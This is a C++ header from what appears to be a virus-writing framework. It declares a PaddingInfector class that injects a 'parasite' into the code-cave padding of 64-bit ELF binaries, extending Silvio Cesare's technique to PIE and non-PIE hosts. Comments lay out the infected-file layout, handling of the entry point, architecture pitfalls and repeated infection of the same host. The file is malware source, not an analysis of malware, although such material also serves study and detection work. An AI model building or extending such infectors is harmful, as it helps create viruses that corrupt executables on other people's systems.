#pragma once
#include <elf.h>
#include <optional>
#include <span>
#include "infector/injection_result.hh"

namespace vf::infector {
// This algorithm injects a parasite into an 64 bit elf's code segment padding,
// based on the paper publish by Silvio Cesare:
// https://vxug.fakedoma.in/archive/VxHeaven/lib/vsc01.html
// The original paper presented a POC but it was targeting 32-bit non-pie
// binaries. We have extended it here to work on 64-bit pie and non-pie
// binaries.
//
//  host elf structure                           infected elf structure
//  -------------------                          -----------------------
//  elf_hdr            <------|    |----->       elf_hdr
//  phdrs                 CODE|    |CODE         phdrs
//  non-exec sections         |    |             non-exec sections
//  exec sections             |    |             exec sections
//  padding            <------|    |----->       *virus <---------
//  non-exec sections  <------|    |----->       non-exec sections
//  shdrs                 RO  |    | RO          shdrs
//                     <------|    |----->
//
// The algorithm is fairly straight forward as it relies on the fact that mmap
// can only assign different permission bits on pages, which creates a "code
// cave" that the parasite can live in.
//
// WARNING: because the insertion point is always not going to be page aligned
// (padding insertion), for arm's adrp instruction it will break if the parasite
// refers to rodata.
// For example:
//
//    adrp	x0, 0x0
//    add x0, x0, #0x544 (compiler generated page offset.)
//
// If the code is inserted at a place that is not a multiple of 4k, the
// generated offset would be wrong.
//
// Make sure the parasite doesn't merge text with rodata for aarch64 if this
// infection method is used. This is not a problem for x86-64 because the
// lea offset(%rip),%rdi can be relocated safely even to places that are not
// page aligned.
//
// Note that this algorithm is safe to recursively infect the victim, as long as
// the padding space is not exhausted. It's recommended to use an infection
// signature to avoid this.
//
// This algorithm is simple to implement, and hard to go wrong but the success
// rate depends highly on the padding size. For small viruses this is a good
// choice.
class PaddingInfector {
 public:
  // Return the size of the binary after a successful infection. Because we
  // inject into text padding, the size of the binary will not change.
  // @return The binary size after a successful infection.
  size_t injected_host_size() { return host_size_; }

  // Scan the elf to see if it can be injected with a parasite into a code cave.
  // @param host_mapping The host elf mapping.
  // @param parasite_size The size of the parasite.
  // @return True if the host binary can be injected.
  bool analyze(std::span<const std::byte> host_mapping,
               std::span<const std::byte> parasite_mapping);

  // Perform the injection,
  // @param host_mapping The host binary to be injected.
  // @param parasite_mapping The virus.
  // @return the injection result. std::nullopt if injection failed.
  // Callers are responsible for memory allocation. This class is no-owning.
  std::optional<InjectionResult> inject(
      std::span<std::byte> host_mapping,
      std::span<const std::byte> parasite_mapping);

 private:
  size_t host_size_{};

  // the code cave size that is available for insertion.
  size_t padding_size_{};

  // the last byte offset of code setment in file.
  Elf64_Off code_segment_last_byte_offset_{};

  // the offset in file that the first byte of parasite code starts.
  Elf64_Off parasite_file_offset_{};

  // the fixed virtual memory address the parasite code is loaded to. Only
  // valid for EXEC elfs.
  Elf64_Addr parasite_load_address_{};

  Elf64_Addr original_entry_point_{};

  // the program header entry corresponding to the code segment that will be
  // patched.
  size_t patch_phdr_entry_idx_{};

  // the parasite size with extra alignment padding accounted for.
  size_t parasite_size_and_padding_{};
};

}  // namespace vf::infector